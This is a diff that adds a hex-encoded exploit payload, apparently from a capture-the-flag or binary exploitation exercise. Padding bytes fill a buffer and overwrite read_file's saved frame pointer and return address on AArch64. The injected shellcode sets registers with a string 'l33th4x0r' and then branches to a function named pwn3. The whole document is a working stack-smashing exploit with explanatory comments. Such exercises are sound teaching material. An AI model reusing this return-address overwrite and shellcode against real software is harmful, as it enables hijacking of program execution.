@@ -1,0 +1,21 @@
+ff ff ff ff ff ff ff ff // Clobbering
+ff ff ff ff ff ff ff ff // Clobbering
+ff ff ff ff ff ff ff ff // Clobbering
+ff ff ff ff ff ff ff ff // Clobbering
+ff ff ff ff ff ff ff ff // Clobbering
+ff ff ff ff ff ff ff ff // Clobbering
+ff ff ff ff ff ff ff ff // Clobbering
+ff ff ff ff ff ff ff ff // Clobbering
+ff ff ff ff ff ff ff ff // Clobbering
+ff ff ff ff ff ff ff ff // Clobbering
+ff ff ff ff ff ff ff ff // Clobbering
+ff ff ff ff ff ff ff ff // Clobbering
+aa aa aa aa aa aa aa aa // Clobber read_file's saved x29 (sp)
+c0 c5 f0 ff ff ff 00 00 // Overwrite read_file's saved x30 to line 11 of this file
+ff ff ff ff ff ff ff ff // Some padding
+ff ff ff ff ff ff ff ff // Some padding
+00 05 80 D2 81 BB 98 D2 // Move 40 into x0 and half of address of string into x1
+01 FE BF F2 E1 FF DF F2 // Moves rest of string address into x1
+83 14 81 D2 03 08 A0 F2 // Moves address of pwn3 into x3
+60 00 1F D6 6C 33 33 74 // Branches to x3 and contains first half of string
+68 34 78 30 72 00 00 00 // Other half of string
